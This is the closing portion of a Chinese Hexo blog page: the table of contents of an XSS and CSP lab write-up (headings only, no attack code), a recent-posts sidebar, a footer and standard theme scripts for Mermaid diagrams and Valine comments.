class="toc-text">Question</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-Task-6-Writing-a-Self-Propagating-XSS-Worm"><span class="toc-number">4.7.</span> <span class="toc-text">3.7 Task 6: Writing a Self-Propagating XSS Worm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Link-Approach"><span class="toc-number">4.7.1.</span> <span class="toc-text">Link Approach</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-Approach"><span class="toc-number">4.7.2.</span> <span class="toc-text">DOM Approach</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Task-7-Defeating-XSS-Attacks-Using-CSP"><span class="toc-number">5.</span> <span class="toc-text">4 Task 7: Defeating XSS Attacks Using CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-Experiment-Website-setup"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 Experiment Website setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-The-web-page-for-the-experiment"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 The web page for the experiment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-Setting-CSP-Policies"><span class="toc-number">5.3.</span> <span class="toc-text">4.3 Setting CSP Policies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP-configuration-by-Apache"><span class="toc-number">5.3.1.</span> <span class="toc-text">CSP configuration by Apache.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP-configuration-by-web-applications"><span class="toc-number">5.3.2.</span> <span class="toc-text">CSP configuration by web applications.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-Lab-tasks"><span class="toc-number">5.4.</span> <span class="toc-text">4.4 Lab tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q1-Q2%EF%BC%9A%E8%AE%BF%E9%97%AE%E4%B8%89%E4%B8%AA%E7%BD%91%E5%9D%80%EF%BC%8C%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B"><span class="toc-number">5.4.1.</span> <span class="toc-text">Q1 &amp;&amp; Q2：访问三个网址，结果如下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q3-%E4%BF%AE%E6%94%B9-apache-csp-conf"><span class="toc-number">5.4.2.</span> <span class="toc-text">Q3 修改 apache_csp.conf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q4-%E4%BF%AE%E6%94%B9-apache-csp-conf"><span class="toc-number">5.4.3.</span> <span class="toc-text">Q4 修改 apache_csp.conf</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/06/golang-select/" title="golang基础篇（一）：goroutine, channels, select">golang基础篇（一）：goroutine, channels, select</a><time datetime="2025-03-06T00:19:46.000Z" title="发表于 2025-03-06 08:19:46">2025-03-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/07/bagu/" title="八股复习1">八股复习1</a><time datetime="2025-02-07T04:16:26.000Z" title="发表于 2025-02-07 12:16:26">2025-02-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/03/lock-2/" title="Java 锁 （二）AQS">Java 锁 （二）AQS</a><time datetime="2025-02-03T10:29:22.000Z" title="发表于 2025-02-03 18:29:22">2025-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/03/lock-1/" title="Java 锁 （一）">Java 锁 （一）</a><time datetime="2025-02-03T09:24:42.000Z" title="发表于 2025-02-03 17:24:42">2025-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/04/ba-gu-training-KamaCoder11/" title="ba-gu-training-KamaCoder11">ba-gu-training-KamaCoder11</a><time datetime="2024-12-04T04:25:28.000Z" title="发表于 2024-12-04 12:25:28">2024-12-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By liujinglong</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b2"></script><script src="/js/main.js?v=4.14.0-b2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '4JE6J6Fimc9mBF9PTJvsX6P2-gzGzoHsz',
+      appKey: '0F61JyHXoFJLYMGMy6p9aZhN',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
